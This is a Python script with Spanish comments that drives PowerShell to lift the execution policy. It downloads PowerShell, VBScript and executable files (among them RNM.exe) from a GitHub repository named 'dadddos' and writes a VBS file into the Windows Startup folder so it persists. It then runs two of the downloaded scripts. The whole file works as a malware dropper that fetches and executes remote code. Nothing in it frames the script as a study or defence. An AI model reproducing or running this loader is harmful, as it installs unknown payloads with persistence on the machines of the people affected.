import subprocess

# Comando para cambiar la Execution Policy
change_execution_policy = 'Set-ExecutionPolicy Unrestricted -Scope Process -Force'

# Lista de comandos para descargar archivos y ejecutarlos
commands = [
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/MainWinStyle.ps1 -OutFile C:\\Users\\Public\\MainWinStyle.ps1',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/s44.vbs -OutFile C:\\Users\\Public\\s44.vbs',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\\Users\\Public\\RNM.exe',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/s44.vbs -OutFile "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\s44.vbs"',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/tasl.ps1 -OutFile C:\\Users\\Public\\tasl.ps1',
    'C:\\Users\\Public\\tasl.ps1',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/dlhsty.ps1 -OutFile C:\\Users\\Public\\dlhsty.ps1',
    'C:\\Users\\Public\\dlhsty.ps1'
]

try:
    process = subprocess.Popen(['powershell'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)

    # Cambiar la Execution Policy
    process.stdin.write(change_execution_policy + '\n')

    # Ejecutar los comandos para descargar y ejecutar los archivos
    for command in commands:
        process.stdin.write(command + '\n')

    process.stdin.close()

    output, error = process.communicate()
    if output:
        print(f"Output: {output}")
    if error:
        print(f"Error: {error}")

except subprocess.CalledProcessError as e:
    print(f"Error occurred: {e}")
